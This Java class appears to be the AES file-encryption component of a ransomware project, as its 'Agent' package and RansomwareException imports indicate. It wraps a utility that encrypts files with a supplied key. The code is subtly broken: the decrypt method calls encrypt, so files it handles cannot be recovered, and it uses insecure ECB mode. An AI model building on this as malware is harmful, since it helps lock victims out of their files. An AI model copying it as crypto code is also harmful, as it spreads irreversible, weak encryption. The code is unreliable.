package Agent.EncryptionAlgo;

import java.io.File;
import java.security.GeneralSecurityException;

import javax.crypto.SecretKey;

import Agent.exceptions.CryptoException;
import Agent.exceptions.RansomwareException;

public class AES implements CryptoInterface {

	@Override
	public void encrypt(SecretKey skey, File fileToEncrypt) throws RansomwareException, GeneralSecurityException {

		try {
			JavaCryptoUtil.encrypt(skey, fileToEncrypt, "AES/ECB/PKCS5Padding");
		} catch (CryptoException e) {
			throw new CryptoException("problem with encrypting", e.getCause());
		}

	}

	@Override
	public void decrypt(SecretKey skey, File fileToDecrypt)throws RansomwareException, GeneralSecurityException {

		try {
			JavaCryptoUtil.encrypt(skey, fileToDecrypt, "AES/ECB/PKCS5Padding");
		} catch (CryptoException e) {
			throw new CryptoException("problem with decrypting", e.getCause());
		}
	}

}
